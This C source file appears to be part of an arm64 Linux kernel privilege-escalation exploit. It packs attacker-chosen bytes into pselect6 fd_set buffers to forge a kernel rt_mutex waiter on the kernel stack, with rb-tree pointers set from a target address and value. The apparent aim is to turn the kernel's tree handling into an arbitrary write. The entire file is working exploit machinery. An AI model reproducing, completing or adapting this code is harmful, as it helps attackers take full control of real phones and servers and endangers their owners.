#include "common.h"

#define GL_SELECT_NFDS 0x140
#define GL_FDSET_BYTES ((GL_SELECT_NFDS + 63) / 64 * 8)

#define GL_PSELECT_NFDS GL_SELECT_NFDS

static_assert(GL_FDSET_BYTES == 40,
              "nfds=0x140 must yield 40-byte fd_sets");
static_assert(GL_WAITER_DEADLINE + 8 <= 3 * GL_FDSET_BYTES,
              "the stamped waiter layout must fit in the three fd_sets");

typedef struct {
    uint64_t words[GL_FDSET_BYTES / 8];
} gl_fdset;

static inline void gl_fdset_zero(gl_fdset *s)
{
    memset(s->words, 0, sizeof(s->words));
}

static inline long gl_pselect_now(int nfds, gl_fdset *rd, gl_fdset *wr,
                                  gl_fdset *ex, struct gl_timespec *ts)
{
    register long x0 __asm__("x0") = (long)nfds;
    register long x1 __asm__("x1") = (long)rd;
    register long x2 __asm__("x2") = (long)wr;
    register long x3 __asm__("x3") = (long)ex;
    register long x4 __asm__("x4") = (long)ts;
    register long x5 __asm__("x5") = 0;
    register long x8 __asm__("x8") = GL_SYS_PSELECT6;
    __asm__ volatile("svc #0"
                     : "+r"(x0)
                     : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5), "r"(x8)
                     : "memory");
    return x0;
}

static int s_filler_fds[GL_FD_DUP_COUNT];
static int s_filler_done;

static int gl_fd_filler_prepare(int *kept_fd)
{
    int i;

    if (kept_fd)
        *kept_fd = -1;

    if (s_filler_done)
        return 0;
    s_filler_done = 1;

    for (i = 0; i < GL_FD_DUP_COUNT; i++) {
        int fd = dup(0);
        if (fd < 0)
            break;
        s_filler_fds[i] = fd;
    }

    return 0;
}

static void stamp_word(gl_fdset *rd, gl_fdset *wr, gl_fdset *ex,
                       int byte_off, uint64_t value)
{
    const uint8_t *p = (const uint8_t *)&value;
    for (int i = 0; i < (int)sizeof(value); ++i) {
        int off = byte_off + i;
        if (off < 0 || off >= 3 * GL_FDSET_BYTES)
            continue;
        if (off < GL_FDSET_BYTES)
            ((uint8_t *)rd)[off] = p[i];
        else if (off < 2 * GL_FDSET_BYTES)
            ((uint8_t *)wr)[off - GL_FDSET_BYTES] = p[i];
        else
            ((uint8_t *)ex)[off - 2 * GL_FDSET_BYTES] = p[i];
    }
}

static void gl_fdset_fill(gl_fdset *rd, gl_fdset *wr, gl_fdset *ex,
                          uint64_t target, uint64_t value,
                          uint64_t task_word, uint64_t fake_lock,
                          uint32_t prio_word)
{
    uint64_t parent_color = (target - 8) | (value != 0 ? 1ULL : 0ULL);

    const int d = 0;

    stamp_word(rd, wr, ex, d + GL_WAITER_TREE_PARENT, parent_color);
    stamp_word(rd, wr, ex, d + GL_WAITER_TREE_RIGHT, value);
    stamp_word(rd, wr, ex, d + GL_WAITER_TREE_LEFT, 0);

    stamp_word(rd, wr, ex, d + GL_WAITER_PI_PARENT, 0);
    stamp_word(rd, wr, ex, d + GL_WAITER_PI_RIGHT, 0);
    stamp_word(rd, wr, ex, d + GL_WAITER_PI_LEFT, 0);

    stamp_word(rd, wr, ex, d + GL_WAITER_TASK, task_word);
    stamp_word(rd, wr, ex, d + GL_WAITER_LOCK, fake_lock);
    stamp_word(rd, wr, ex, d + GL_WAITER_PRIO, (uint64_t)prio_word);
    stamp_word(rd, wr, ex, d + GL_WAITER_DEADLINE, 0);
}

static gl_fdset s_route_rd;
static gl_fdset s_route_wr;
static gl_fdset s_route_ex;
static struct gl_timespec s_route_ts;

static void fdset_put_bytes(gl_fdset *rd, gl_fdset *wr, gl_fdset *ex,
                            const uint8_t *img, size_t len)
{
    size_t i;

    for (i = 0; i < len && i < 3 * GL_FDSET_BYTES; i++) {
        uint8_t *base;
        size_t off = i % GL_FDSET_BYTES;

        if (i < GL_FDSET_BYTES)
            base = (uint8_t *)rd;
        else if (i < 2 * GL_FDSET_BYTES)
            base = (uint8_t *)wr;
        else
            base = (uint8_t *)ex;
        base[off] = img[i];
    }
}

static void carrier_pselect6(const uint8_t *img, size_t len)
{
    fdset_put_bytes(&s_route_rd, &s_route_wr, &s_route_ex, img, len);

    s_route_ts.tv_sec = 0;
    s_route_ts.tv_nsec = 0;

    errno = 0;
    (void)gl_pselect_now(GL_PSELECT_NFDS, &s_route_rd, &s_route_wr,
                         &s_route_ex, &s_route_ts);
}

void gl_fdset_arm(void)
{
    gl_fdset_zero(&s_route_rd);
    gl_fdset_zero(&s_route_wr);
    gl_fdset_zero(&s_route_ex);

    (void)gl_fd_filler_prepare(NULL);

    g_route_stage.store(1, std::memory_order_release);
    errno = 0;

    gl_fdset_fill(&s_route_rd, &s_route_wr, &s_route_ex,
                  g_w_target, g_w_value, g_scratch_lo,
                  g_w_lock ? g_w_lock : g_fake_lock,
                  GL_STAMP_PRIO_NORMAL);
    carrier_pselect6(NULL, 0);

    g_route_result.store(0);
    g_route_errno = errno;
    g_route_stage.store(2, std::memory_order_release);
}
